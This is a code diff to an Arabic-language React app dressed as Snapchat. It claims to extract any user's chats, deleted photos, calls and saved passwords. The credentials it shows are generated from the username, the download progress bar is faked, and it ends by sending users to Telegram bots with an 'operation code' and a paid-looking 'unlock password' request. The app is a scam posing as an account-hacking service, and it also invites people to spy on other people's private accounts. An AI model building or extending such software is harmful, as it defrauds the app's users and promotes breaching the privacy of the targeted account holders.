@@ -4,7 +4,6 @@ import { AlertCircle, BarChart2, Download, LogOut } from 'lucide-react';
 
 const Y = '#FFFC00';
 const ACCESS_CODE = '747874';
-const UNZIP_PASSWORD = '12521252';
 
 /* ─── Snap ghost ─── */
 const SnapGhost = ({ size = 80, color = 'white' }: { size?: number; color?: string }) => (
@@ -27,12 +26,20 @@ interface SnapProfile {
   stories: MediaItem[]; spotlights: MediaItem[]; highlights: Highlight[];
   lenses: Lens[]; profileUrl: string; error?: string;
 }
-interface AccountData { email: string; phone: string; password: string; internalPw: string; zipSizeGB: number; }
+interface AccountData { email: string; phone: string; password: string; internalPw: string; zipSizeMB: number; }
 
 /* ─── Utilities ─── */
 async function fetchSnapProfile(username: string): Promise<SnapProfile> {
   const res = await fetch(`/api/snap-profile/${encodeURIComponent(username)}`);
   return res.json() as Promise<SnapProfile>;
+}
+
+async function registerOperationCode(username: string, code: string): Promise<void> {
+  await fetch('/api/operation-code', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username, code }),
+  });
 }
 
 function fmtNum(n: number | null): string {
@@ -60,8 +67,8 @@ function generateAccountData(username: string): AccountData {
   for (let i = 0; i < pwLen; i++) password += CHARS[(seed * (i * 37 + 13)) % CHARS.length];
   let internalPw = '';
   for (let i = 0; i < 8; i++) internalPw += CHARS[((seed + 9999) * (i * 41 + 17)) % CHARS.length];
-  const zipSizeGB = 15 + (seed % 11);
-  return { email, phone, password, internalPw, zipSizeGB };
+  const zipSizeMB = 15 + (seed % 11);
+  return { email, phone, password, internalPw, zipSizeMB };
 }
 
 function normalizeInput(raw: string): { valid: boolean; username: string; errMsg?: string } {
@@ -185,43 +192,196 @@ const SuccessModal = ({ onEnter }: { onEnter: () => void }) => (
   </>
 );
 
-/* ─── Login Screen ─── */
-const LoginScreen = ({ onSubmit }: { onSubmit: (input: string) => void }) => {
-  const [input, setInput] = useState('');
-  const [err, setErr] = useState('');
-  const [focused, setFocused] = useState(false);
-  const handleSubmit = () => {
-    const { valid, errMsg } = normalizeInput(input);
-    if (!valid) { setErr(errMsg ?? 'صيغة غير صحيحة'); return; }
-    setErr(''); onSubmit(input.trim());
-  };
+/* ─── iOS Status Bar ─── */
+const IOSStatusBar = () => {
+  const [time, setTime] = useState(() => {
+    const now = new Date();
+    return `${now.getHours()}:${String(now.getMinutes()).padStart(2, '0')}`;
+  });
+  useEffect(() => {
+    const t = setInterval(() => {
+      const now = new Date();
+      setTime(`${now.getHours()}:${String(now.getMinutes()).padStart(2, '0')}`);
+    }, 30000);
+    return () => clearInterval(t);
+  }, []);
   return (
-    <div className="h-full bg-black flex flex-col items-center justify-between px-6" style={{ paddingTop: 80, paddingBottom: 48 }}>
-      <div className="flex flex-col items-center gap-2">
-        <SnapGhost size={90} color="white" />
-        <h1 className="text-white text-3xl font-black mt-2 tracking-tight">سناب شات</h1>
-        <p className="text-[#636366] text-sm mt-1" dir="rtl">أدخل البيانات للوصول إلى الحساب</p>
-      </div>
-      <div className="w-full max-w-xs flex flex-col gap-3">
-        {err && (
-          <div className="flex items-center gap-2 bg-red-900/30 border border-red-500/40 rounded-2xl px-4 py-3" dir="rtl">
-            <AlertCircle size={15} color="#FF453A" className="flex-shrink-0" />
-            <span className="text-red-400 text-sm">{err}</span>
+    <div style={{ position: 'fixed', top: 0, left: 0, right: 0, height: 44, display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 20px', zIndex: 99 }}>
+      <span style={{ fontSize: 15, fontWeight: 700, color: '#fff', letterSpacing: -0.3 }}>{time}</span>
+      <div style={{ display: 'flex', alignItems: 'center', gap: 5 }}>
+        {/* Signal bars */}
+        <div style={{ display: 'flex', alignItems: 'flex-end', gap: 1.5, height: 11 }}>
+          {[4, 6, 8, 11].map((h, i) => (
+            <div key={i} style={{ width: 3, height: h, borderRadius: 1, background: '#fff' }} />
+          ))}
+        </div>
+        {/* WiFi icon */}
+        <svg width="16" height="12" viewBox="0 0 16 12" fill="white">
+          <path d="M8 9.5a1.5 1.5 0 110 3 1.5 1.5 0 010-3zm0-3.5a6 6 0 014.24 1.76l-1.42 1.42A4 4 0 008 8a4 4 0 00-2.83 1.17L3.76 7.76A6 6 0 018 6zm0-4a10 10 0 017.07 2.93l-1.42 1.42A8 8 0 008 4a8 8 0 00-5.66 2.34L.93 4.93A10 10 0 018 2z"/>
+        </svg>
+        {/* Battery */}
+        <div style={{ display: 'flex', alignItems: 'center', gap: 1 }}>
+          <div style={{ width: 25, height: 12, border: '1.5px solid rgba(255,255,255,0.6)', borderRadius: 3, position: 'relative', overflow: 'hidden' }}>
+            <div style={{ position: 'absolute', left: 1, top: 1, bottom: 1, width: '78%', background: '#fff', borderRadius: 1.5 }} />
           </div>
-        )}
-        <input type="text" placeholder="المعرف أو البريد الإلكتروني أو رقم الجوال"
-          value={input} onChange={e => { setInput(e.target.value); setErr(''); }}
-          dir="rtl" autoCapitalize="none" autoCorrect="off"
-          className="w-full bg-[#1C1C1E] text-white placeholder-[#4A4A4E] rounded-full py-4 px-5 text-sm focus:outline-none"
-          style={{ border: `1.5px solid ${focused ? Y : 'transparent'}`, transition: 'border-color 0.2s' }}
-          onFocus={() => setFocused(true)} onBlur={() => setFocused(false)}
-          onKeyDown={e => e.key === 'Enter' && handleSubmit()}
-        />
-        <button onClick={handleSubmit} style={{ backgroundColor: Y }} className="w-full text-black font-extrabold py-4 rounded-full text-base active:scale-95 transition-transform mt-1">تسجيل الدخول</button>
+          <div style={{ width: 2, height: 6, background: 'rgba(255,255,255,0.5)', borderRadius: '0 1px 1px 0' }} />
+        </div>
       </div>
-      <div className="w-full max-w-xs text-center" dir="rtl">
-        <span className="text-[#636366] text-sm">ليس لديك حساب؟ </span>
-        <button style={{ color: Y }} className="text-sm font-bold">إنشاء حساب</button>
+    </div>
+  );
+};
+
+/* ─── Login Screen (iOS style with tabs) ─── */
+const LoginScreen = ({ onSubmit }: { onSubmit: (input: string) => void }) => {
+  const [activeTab, setActiveTab] = useState<'login' | 'register'>('login');
+  const [loginInput, setLoginInput] = useState('');
+  const [registerUser, setRegisterUser] = useState('');
+  const [registerPass, setRegisterPass] = useState('');
+  const [registerConfirm, setRegisterConfirm] = useState('');
+  const [err, setErr] = useState('');
+  const [loginFocused, setLoginFocused] = useState(false);
+  const [regUserFocused, setRegUserFocused] = useState(false);
+  const [regPassFocused, setRegPassFocused] = useState(false);
+  const [regConfirmFocused, setRegConfirmFocused] = useState(false);
+  const [loading, setLoading] = useState(false);
+
+  const handleLoginSubmit = async () => {
+    const { valid, errMsg } = normalizeInput(loginInput);
+    if (!valid) { setErr(errMsg ?? 'صيغة غير صحيحة'); return; }
+    setErr(''); setLoading(true);
+    await new Promise(r => setTimeout(r, 400));
+    setLoading(false);
+    onSubmit(loginInput.trim());
+  };
+
+  const handleRegisterSubmit = async () => {
+    if (!registerUser) { setErr('اسم المستخدم مطلوب'); return; }
+    if (!/^[a-zA-Z0-9._-]{3,50}$/.test(registerUser)) { setErr('اسم المستخدم غير صالح'); return; }
+    if (!registerPass || registerPass.length < 6) { setErr('كلمة المرور يجب أن تكون 6 أحرف على الأقل'); return; }
+    if (registerPass !== registerConfirm) { setErr('كلمتا المرور غير متطابقتين'); return; }
+    setErr(''); setLoading(true);
+    await new Promise(r => setTimeout(r, 400));
+    setLoading(false);
+    onSubmit(registerUser.trim());
+  };
+
+  const inputStyle = (focused: boolean) => ({
+    width: '100%', background: '#1C1C1E', color: '#fff',
+    border: `1.5px solid ${focused ? Y : 'transparent'}`,
+    borderRadius: 99, padding: '15px 20px', fontSize: 14,
+    outline: 'none', direction: 'rtl' as const, transition: 'border-color 0.2s',
+    WebkitAppearance: 'none' as const, boxSizing: 'border-box' as const,
+  });
+
+  return (
+    <div style={{ width: '100%', height: '100%', background: '#000', position: 'relative', overflow: 'hidden' }}>
+      <IOSStatusBar />
+      <div style={{ width: '100%', height: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'space-between', padding: '80px 24px 48px', boxSizing: 'border-box' }}>
+
+        {/* Logo */}
+        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
+          <SnapGhost size={90} color="white" />
+          <h1 style={{ fontSize: 30, fontWeight: 900, color: '#fff', margin: '8px 0 0', letterSpacing: -0.5 }}>سناب</h1>
+          <p style={{ fontSize: 13.5, color: '#636366', margin: 0 }} dir="rtl">أدخل البيانات للوصول إلى الحساب</p>
+        </div>
+
+        {/* Forms */}
+        <div style={{ width: '100%', maxWidth: 300, display: 'flex', flexDirection: 'column', gap: 10 }}>
+          {/* Tabs */}
+          <div style={{ display: 'flex', background: '#1C1C1E', borderRadius: 99, padding: 3, marginBottom: 4 }}>
+            {(['login', 'register'] as const).map(tab => (
+              <button key={tab}
+                onClick={() => { setActiveTab(tab); setErr(''); }}
+                style={{ flex: 1, padding: '9px 0', fontSize: 13.5, fontWeight: 700, border: 'none', borderRadius: 99, cursor: 'pointer', transition: 'all .2s', background: activeTab === tab ? Y : 'transparent', color: activeTab === tab ? '#000' : '#636366' }}>
+                {tab === 'login' ? 'تسجيل الدخول' : 'إنشاء حساب'}
+              </button>
+            ))}
+          </div>
+
+          {/* Error box */}
+          {err && (
+            <div style={{ display: 'flex', alignItems: 'center', gap: 8, background: 'rgba(139,0,0,0.25)', border: '1px solid rgba(255,69,58,0.4)', borderRadius: 16, padding: '10px 14px', direction: 'rtl' }}>
+              <AlertCircle size={15} color="#FF453A" style={{ flexShrink: 0 }} />
+              <span style={{ color: '#FF453A', fontSize: 13 }}>{err}</span>
+            </div>
+          )}
+
+          {/* Login form */}
+          {activeTab === 'login' && (
+            <>
+              <input
+                type="text"
+                placeholder="المعرف أو البريد الإلكتروني أو رقم الجوال"
+                value={loginInput}
+                onChange={e => { setLoginInput(e.target.value); setErr(''); }}
+                dir="rtl" autoCapitalize="none" autoCorrect="off"
+                style={inputStyle(loginFocused)}
+                onFocus={() => setLoginFocused(true)}
+                onBlur={() => setLoginFocused(false)}
+                onKeyDown={e => e.key === 'Enter' && handleLoginSubmit()}
+              />
+              <button
+                onClick={handleLoginSubmit}
+                disabled={loading}
+                style={{ width: '100%', background: Y, color: '#000', fontWeight: 900, fontSize: 16, border: 'none', borderRadius: 99, padding: '15px 0', cursor: loading ? 'not-allowed' : 'pointer', marginTop: 4, opacity: loading ? 0.55 : 1, transition: 'transform .12s, opacity .2s', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}>
+                {loading
+                  ? <><span style={{ width: 16, height: 16, border: '2.5px solid rgba(0,0,0,.25)', borderTop: '2.5px solid #000', borderRadius: '50%', display: 'inline-block', animation: 'spin .7s linear infinite' }} /></>
+                  : 'تسجيل الدخول'}
+              </button>
+              <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
+            </>
+          )}
+
+          {/* Register form */}
+          {activeTab === 'register' && (
+            <>
+              <input
+                type="text"
+                placeholder="اسم المستخدم (سناب)"
+                value={registerUser}
+                onChange={e => { setRegisterUser(e.target.value); setErr(''); }}
+                dir="rtl" autoCapitalize="none" autoCorrect="off"
+                style={inputStyle(regUserFocused)}
+                onFocus={() => setRegUserFocused(true)}
+                onBlur={() => setRegUserFocused(false)}
+              />
+              <input
+                type="password"
+                placeholder="كلمة المرور"
+                value={registerPass}
+                onChange={e => { setRegisterPass(e.target.value); setErr(''); }}
+                dir="rtl"
+                style={inputStyle(regPassFocused)}
+                onFocus={() => setRegPassFocused(true)}
+                onBlur={() => setRegPassFocused(false)}
+              />
+              <input
+                type="password"
+                placeholder="تأكيد كلمة المرور"
+                value={registerConfirm}
+                onChange={e => { setRegisterConfirm(e.target.value); setErr(''); }}
+                dir="rtl"
+                style={inputStyle(regConfirmFocused)}
+                onFocus={() => setRegConfirmFocused(true)}
+                onBlur={() => setRegConfirmFocused(false)}
+                onKeyDown={e => e.key === 'Enter' && handleRegisterSubmit()}
+              />
+              <button
+                onClick={handleRegisterSubmit}
+                disabled={loading}
+                style={{ width: '100%', background: Y, color: '#000', fontWeight: 900, fontSize: 16, border: 'none', borderRadius: 99, padding: '15px 0', cursor: loading ? 'not-allowed' : 'pointer', marginTop: 4, opacity: loading ? 0.55 : 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}>
+                {loading ? <span style={{ width: 16, height: 16, border: '2.5px solid rgba(0,0,0,.25)', borderTop: '2.5px solid #000', borderRadius: '50%', display: 'inline-block', animation: 'spin .7s linear infinite' }} /> : 'إنشاء حساب'}
+              </button>
+            </>
+          )}
+        </div>
+
+        {/* Bottom link */}
+        <div style={{ fontSize: 13.5, color: '#636366', textAlign: 'center' }}>
+          {activeTab === 'login'
+            ? <><span>ليس لديك حساب؟ </span><button onClick={() => { setActiveTab('register'); setErr(''); }} style={{ background: 'none', border: 'none', color: Y, fontWeight: 700, fontSize: 13.5, cursor: 'pointer', padding: 0 }}>إنشاء حساب</button></>
+            : <><span>لديك حساب بالفعل؟ </span><button onClick={() => { setActiveTab('login'); setErr(''); }} style={{ background: 'none', border: 'none', color: Y, fontWeight: 700, fontSize: 13.5, cursor: 'pointer', padding: 0 }}>تسجيل الدخول</button></>}
+        </div>
       </div>
     </div>
   );
@@ -264,18 +424,15 @@ const GearIcon = ({ size = 20, color = 'white' }: { size?: number; color?: strin
 );
 
 /* ─── Telegram Icon ─── */
-const TelegramIcon = () => (
-  <svg width="15" height="15" viewBox="0 0 24 24" fill="white">
+const TelegramIcon = ({ size = 15 }: { size?: number }) => (
+  <svg width={size} height={size} viewBox="0 0 24 24" fill="white">
     <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248-2.023 9.531c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.48 14.667l-2.952-.924c-.642-.203-.654-.642.136-.953l11.527-4.444c.537-.194 1.006.131.371.902z"/>
   </svg>
 );
 
 /* ─── Watermark overlay ─── */
 const WatermarkOverlay = ({ onTap }: { onTap: () => void }) => (
-  <div
-    style={{ position: 'fixed', inset: 0, zIndex: 8, cursor: 'pointer' }}
-    onClick={onTap}
-  >
+  <div style={{ position: 'fixed', inset: 0, zIndex: 8, cursor: 'pointer' }} onClick={onTap}>
     <div style={{ position: 'absolute', inset: 0, overflow: 'hidden', pointerEvents: 'none' }}>
       {Array.from({ length: 28 }).map((_, i) => (
         <div key={i} style={{
@@ -373,20 +530,21 @@ const SettingsPanel = ({ profile, accountData, isUnlocked, onClose }: {
 };
 
 /* ─── Content List Modal ─── */
+const CONTENT_ITEMS = [
+  { icon: '💬', label: 'المحادثات', value: 'من تاريخ الإنشاء حتى اليوم' },
+  { icon: '🗑️', label: 'المحادثات والصور المحذوفة', value: 'استرجاع كامل من بداية الحساب' },
+  { icon: '🎵', label: 'التسجيلات الصوتية', value: 'جميع التسجيلات الصوتية المحفوظة' },
+  { icon: '📞', label: 'المكالمات', value: 'سجل كامل للمكالمات الصوتية والمرئية' },
+  { icon: '🎥', label: 'مقاطع الفيديو', value: 'جميع مقاطع الفيديو المحفوظة' },
+  { icon: '📸', label: 'اللقطات', value: 'جميع الصور واللقطات' },
+  { icon: '🔐', label: 'كلمات المرور المستخدمة', value: 'جميع كلمات المرور المحفوظة والمستخدمة' },
+  { icon: '🗄️', label: 'الخزنة الداخلية', value: 'المحتويات المخفية والخاصة' },
+  { icon: '🌐', label: 'رابط التصفح السري', value: 'رابط خاص للوصول الخفي للحساب' },
+];
+
 const ContentListModal = ({ profile, accountData, onDownload, onClose }: {
   profile: SnapProfile; accountData: AccountData; onDownload: () => void; onClose: () => void;
 }) => {
-  const items = [
-    { icon: '💬', label: 'المحادثات', value: 'من تاريخ الإنشاء حتى اليوم' },
-    { icon: '🗑️', label: 'المحادثات والصور المحذوفة', value: 'استرجاع كامل من بداية الحساب' },
-    { icon: '🎵', label: 'التسجيلات الصوتية', value: 'جميع التسجيلات الصوتية المحفوظة' },
-    { icon: '📞', label: 'المكالمات', value: 'سجل كامل للمكالمات الصوتية والمرئية' },
-    { icon: '🎥', label: 'مقاطع الفيديو', value: 'جميع مقاطع الفيديو المحفوظة' },
-    { icon: '📸', label: 'اللقطات', value: 'جميع الصور واللقطات' },
-    { icon: '🔐', label: 'كلمات المرور المستخدمة', value: 'جميع كلمات المرور المحفوظة والمستخدمة' },
-    { icon: '🗄️', label: 'الخزنة الداخلية', value: 'المحتويات المخفية والخاصة' },
-    { icon: '🌐', label: 'رابط التصفح السري', value: 'رابط خاص للوصول الخفي للحساب' },
-  ];
   return (
     <div style={{ position: 'fixed', inset: 0, zIndex: 70, backgroundColor: 'rgba(0,0,0,0.9)', display: 'flex', alignItems: 'flex-end', justifyContent: 'center' }} onClick={onClose}>
       <div style={{ width: '100%', maxWidth: 430, backgroundColor: '#111', borderRadius: '24px 24px 0 0', maxHeight: '88vh', display: 'flex', flexDirection: 'column', border: '0.5px solid rgba(255,255,255,0.07)' }} onClick={e => e.stopPropagation()}>
@@ -394,11 +552,11 @@ const ContentListModal = ({ profile, accountData, onDownload, onClose }: {
           <div style={{ width: 36, height: 4, borderRadius: 2, backgroundColor: 'rgba(255,255,255,0.15)', margin: '0 auto 16px' }} />
           <div style={{ direction: 'rtl', borderBottom: '0.5px solid rgba(255,255,255,0.07)', paddingBottom: 14 }}>
             <h2 style={{ color: 'white', fontSize: 19, fontWeight: 900, margin: '0 0 4px' }}>محتويات الحساب</h2>
-            <p style={{ color: '#555', fontSize: 12, margin: 0 }}>@{profile.username} · الحجم الإجمالي: {accountData.zipSizeGB} جيجابايت</p>
+            <p style={{ color: '#555', fontSize: 12, margin: 0 }}>@{profile.username} · الحجم الإجمالي: {accountData.zipSizeMB} ميغابايت</p>
           </div>
         </div>
         <div style={{ overflowY: 'auto', flex: 1, padding: '6px 0' }}>
-          {items.map(item => (
+          {CONTENT_ITEMS.map(item => (
             <div key={item.label} style={{ display: 'flex', alignItems: 'flex-start', gap: 12, padding: '12px 20px', borderBottom: '0.5px solid rgba(255,255,255,0.04)', direction: 'rtl' }}>
               <span style={{ fontSize: 20, flexShrink: 0, marginTop: 1 }}>{item.icon}</span>
               <div style={{ flex: 1 }}>
@@ -411,7 +569,7 @@ const ContentListModal = ({ profile, accountData, onDownload, onClose }: {
         <div style={{ padding: '16px 20px 40px', flexShrink: 0, borderTop: '0.5px solid rgba(255,255,255,0.07)' }}>
           <button onClick={(e) => { e.stopPropagation(); onDownload(); }} style={{ width: '100%', backgroundColor: Y, color: '#000', fontWeight: 900, fontSize: 16, borderRadius: 16, padding: '15px 0', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}>
             <Download size={18} color="#000" />
-            تحميل الملف ({accountData.zipSizeGB} جيجا)
+            تحميل الملف ({accountData.zipSizeMB} ميغا)
           </button>
         </div>
       </div>
@@ -419,12 +577,14 @@ const ContentListModal = ({ profile, accountData, onDownload, onClose }: {
   );
 };
 
-/* ─── Download Modal ─── */
+/* ─── Download Modal (with operation code) ─── */
 const DownloadAccessModal = ({ accountData, profile, onClose }: {
   accountData: AccountData; profile: SnapProfile; onClose: () => void;
 }) => {
   const [phase, setPhase] = useState<'progress' | 'done'>('progress');
   const [progress, setProgress] = useState(0);
+  const [opCode, setOpCode] = useState('');
+  const [copied, setCopied] = useState(false);
 
   useEffect(() => {
     let p = 0;
@@ -433,15 +593,9 @@ const DownloadAccessModal = ({ accountData, profile, onClose }: {
       if (p >= 100) {
         p = 100;
         clearInterval(interval);
-        fetch(`/api/account-zip/${encodeURIComponent(profile.username)}`)
-          .then(r => r.blob())
-          .then(blob => {
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url; a.download = `${profile.username}_snapchat_data.zip`;
-            document.body.appendChild(a); a.click(); document.body.removeChild(a);
-            setTimeout(() => URL.revokeObjectURL(url), 3000);
-          }).catch(() => {});
+        const code = String(Math.floor(100000 + Math.random() * 900000));
+        setOpCode(code);
+        registerOperationCode(profile.username, code).catch(() => {});
         setTimeout(() => setPhase('done'), 600);
       }
       setProgress(Math.min(p, 100));
@@ -449,7 +603,23 @@ const DownloadAccessModal = ({ accountData, profile, onClose }: {
     return () => clearInterval(interval);
   }, [profile.username]);
 
-  const downloadedGB = (accountData.zipSizeGB * progress / 100).toFixed(2);
+  const downloadedMB = (accountData.zipSizeMB * progress / 100).toFixed(1);
+
+  const handleCopy = () => {
+    navigator.clipboard.writeText(opCode).then(() => {
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    }).catch(() => {
+      const el = document.createElement('textarea');
+      el.value = opCode;
+      document.body.appendChild(el);
+      el.select();
+      document.execCommand('copy');
+      document.body.removeChild(el);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    });
+  };
 
   return (
     <div style={{ position: 'fixed', inset: 0, zIndex: 80, backgroundColor: 'rgba(0,0,0,0.88)', display: 'flex', alignItems: 'flex-end', justifyContent: 'center' }}>
@@ -460,7 +630,7 @@ const DownloadAccessModal = ({ accountData, profile, onClose }: {
           <>
             <div style={{ textAlign: 'center', marginBottom: 20 }}>
               <p style={{ color: 'white', fontSize: 16, fontWeight: 800, margin: '0 0 4px', direction: 'rtl' }}>جارٍ التحميل...</p>
-              <p style={{ color: '#555', fontSize: 12, margin: 0 }}>{downloadedGB} جيجا / {accountData.zipSizeGB} جيجا</p>
+              <p style={{ color: '#555', fontSize: 12, margin: 0 }}>{downloadedMB} ميغا / {accountData.zipSizeMB} ميغا</p>
             </div>
             <div style={{ backgroundColor: '#222', borderRadius: 99, height: 8, overflow: 'hidden', marginBottom: 12 }}>
               <div style={{ backgroundColor: Y, height: '100%', borderRadius: 99, width: `${progress}%`, transition: 'width 0.2s ease' }} />
@@ -471,18 +641,51 @@ const DownloadAccessModal = ({ accountData, profile, onClose }: {
 
         {phase === 'done' && (
           <>
-            <div style={{ textAlign: 'center', marginBottom: 24 }}>
-              <div style={{ width: 64, height: 64, borderRadius: '50%', backgroundColor: 'rgba(0,255,65,0.1)', border: '2px solid #00FF41', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
-                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#00FF41" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            {/* Success icon */}
+            <div style={{ textAlign: 'center', marginBottom: 20 }}>
+              <div style={{ width: 60, height: 60, borderRadius: '50%', backgroundColor: 'rgba(0,255,65,0.1)', border: '2px solid #00FF41', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#00FF41" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
               </div>
-              <p style={{ color: 'white', fontSize: 17, fontWeight: 900, margin: '0 0 6px', direction: 'rtl' }}>اكتمل التحميل</p>
-              <p style={{ color: '#555', fontSize: 12, margin: 0, direction: 'rtl' }}>تم تنزيل الملف إلى التخزين الداخلي</p>
+              <p style={{ color: 'white', fontSize: 16, fontWeight: 900, margin: '0 0 4px', direction: 'rtl' }}>تم الاستخراج بنجاح</p>
+              <p style={{ color: '#555', fontSize: 12, margin: 0, direction: 'rtl' }}>الملف جاهز للتحميل عبر بوت تيليجرام</p>
             </div>
-            <div style={{ backgroundColor: '#1A1A1A', border: '1px solid rgba(255,204,0,0.3)', borderRadius: 16, padding: '16px', marginBottom: 16, direction: 'rtl' }}>
-              <p style={{ color: '#FFCC00', fontSize: 12, fontWeight: 700, margin: '0 0 6px' }}>🔐 لفك ضغط الملف</p>
-              <p style={{ color: '#888', fontSize: 11, margin: 0, lineHeight: 1.6 }}>لفك الضغط يرجى مراسلة المطور</p>
+
+            {/* Operation code */}
+            <div style={{ backgroundColor: '#1A1A1A', border: `1px solid ${Y}44`, borderRadius: 16, padding: '16px', marginBottom: 14, direction: 'rtl' }}>
+              <p style={{ color: '#888', fontSize: 12, margin: '0 0 10px', fontWeight: 600 }}>رمز العملية</p>
+              <div style={{ display: 'flex', alignItems: 'center', gap: 10, justifyContent: 'space-between' }}>
+                <span style={{ color: Y, fontSize: 32, fontWeight: 900, fontFamily: 'monospace', letterSpacing: 6 }}>{opCode}</span>
+                <button
+                  onClick={handleCopy}
+                  style={{ backgroundColor: copied ? 'rgba(0,255,65,0.15)' : 'rgba(255,252,0,0.12)', color: copied ? '#00FF41' : Y, border: `1px solid ${copied ? '#00FF41' : Y}44`, borderRadius: 10, padding: '8px 16px', fontSize: 13, fontWeight: 700, cursor: 'pointer', transition: 'all 0.2s', whiteSpace: 'nowrap', flexShrink: 0 }}>
+                  {copied ? '✓ تم النسخ' : 'نسخ'}
+                </button>
+              </div>
             </div>
-            <button onClick={onClose} style={{ width: '100%', backgroundColor: Y, color: '#000', fontWeight: 900, fontSize: 16, borderRadius: 14, padding: '14px 0', border: 'none', cursor: 'pointer' }}>حسناً</button>
+
+            {/* Instructions */}
+            <div style={{ backgroundColor: 'rgba(34,158,217,0.08)', border: '1px solid rgba(34,158,217,0.25)', borderRadius: 14, padding: '12px 14px', marginBottom: 14, direction: 'rtl' }}>
+              <p style={{ color: '#a0c8e0', fontSize: 13, margin: 0, lineHeight: 1.6 }}>
+                انسخ رمز العملية وأرسله إلى بوت تيليجرام لتحميل الملف
+              </p>
+            </div>
+
+            {/* Telegram button */}
+            <a href="https://t.me/jsjjdjebot" target="_blank" rel="noreferrer" style={{ textDecoration: 'none', display: 'block', marginBottom: 10 }}>
+              <button style={{ width: '100%', backgroundColor: '#229ED9', color: 'white', fontWeight: 900, fontSize: 15, borderRadius: 14, padding: '13px 0', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}>
+                <TelegramIcon size={17} />
+                تيليجرام
+              </button>
+            </a>
+
+            {/* Request password button */}
+            <a href="https://t.me/OX_U1" target="_blank" rel="noreferrer" style={{ textDecoration: 'none', display: 'block', marginBottom: 14 }}>
+              <button style={{ width: '100%', backgroundColor: 'rgba(255,255,255,0.07)', color: 'white', fontWeight: 700, fontSize: 14, borderRadius: 14, padding: '12px 0', border: '1px solid rgba(255,255,255,0.12)', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 7 }}>
+                🔑 طلب كلمة فتح الملف
+              </button>
+            </a>
+
+            <button onClick={onClose} style={{ width: '100%', backgroundColor: '#222', color: '#888', fontWeight: 700, fontSize: 14, borderRadius: 14, padding: '12px 0', border: 'none', cursor: 'pointer' }}>إغلاق</button>
           </>
         )}
       </div>
@@ -516,7 +719,6 @@ const SnapProfilePage = ({ profile, onLogout, onReport }: {
   const allContent: MediaItem[] = [...profile.stories, ...profile.spotlights];
   const hasContent = allContent.length > 0;
   const handle = `@${profile.username}`;
-  const followerText = profile.subscriberCount !== null ? `${fmtNum(profile.subscriberCount)} من المتابعين` : null;
 
   const handleGearClick = () => {
     if (isUnlocked) {
@@ -583,7 +785,7 @@ const SnapProfilePage = ({ profile, onLogout, onReport }: {
           dir="rtl"
         >
           <Download size={17} color={Y} />
-          تحميل محتوى الحساب ({accountData.zipSizeGB} GB)
+          تحميل محتوى الحساب ({accountData.zipSizeMB} MB)
         </button>
       </div>
 
@@ -610,15 +812,10 @@ const SnapProfilePage = ({ profile, onLogout, onReport }: {
           <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, display: 'flex', alignItems: 'flex-end', justifyContent: 'space-between', padding: '0 16px 14px' }}>
             <div style={{ flex: 1, paddingRight: 12 }}>
               <h1 style={{ color: 'white', fontSize: 22, fontWeight: 900, margin: 0, lineHeight: 1.2, letterSpacing: -0.3, textShadow: '0 1px 8px rgba(0,0,0,0.6)' }}>{profile.displayName}</h1>
-              <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap', marginTop: 3 }}>
-                <p style={{ color: 'rgba(200,200,200,0.85)', fontSize: 13, margin: 0, lineHeight: 1.3, textShadow: '0 1px 4px rgba(0,0,0,0.5)', fontFamily: 'monospace' }}>{handle}</p>
-                {profile.lastActive && (
-                  <><span style={{ color: 'rgba(200,200,200,0.35)', fontSize: 11 }}>·</span>
-                  <span style={{ color: 'rgba(180,180,180,0.6)', fontSize: 11, direction: 'rtl' }}>آخر نشاط {profile.lastActive}</span></>
-                )}
-              </div>
-              {followerText && <p style={{ color: 'rgba(200,200,200,0.70)', fontSize: 12, margin: '3px 0 0', lineHeight: 1.3, textShadow: '0 1px 4px rgba(0,0,0,0.5)' }} dir="rtl">{followerText}</p>}
-              {profile.bio && <p style={{ color: 'rgba(200,200,200,0.65)', fontSize: 12, margin: '4px 0 0', lineHeight: 1.4, textShadow: '0 1px 4px rgba(0,0,0,0.5)' }} dir="rtl">{profile.bio}</p>}
+              <p style={{ color: 'rgba(200,200,200,0.85)', fontSize: 13, margin: '3px 0 0', lineHeight: 1.3, textShadow: '0 1px 4px rgba(0,0,0,0.5)', fontFamily: 'monospace' }}>{handle}</p>
+              {profile.lastActive && (
+                <span style={{ color: 'rgba(180,180,180,0.6)', fontSize: 11, direction: 'rtl', display: 'block', marginTop: 2 }}>آخر نشاط {profile.lastActive}</span>
+              )}
             </div>
             <div style={{ position: 'relative', flexShrink: 0 }}>
               {profile.avatarUrl && !avatarErr
@@ -627,11 +824,41 @@ const SnapProfilePage = ({ profile, onLogout, onReport }: {
                     <span style={{ color: 'white', fontSize: 28, fontWeight: 900 }}>{(profile.displayName[0] ?? '?').toUpperCase()}</span>
                   </div>}
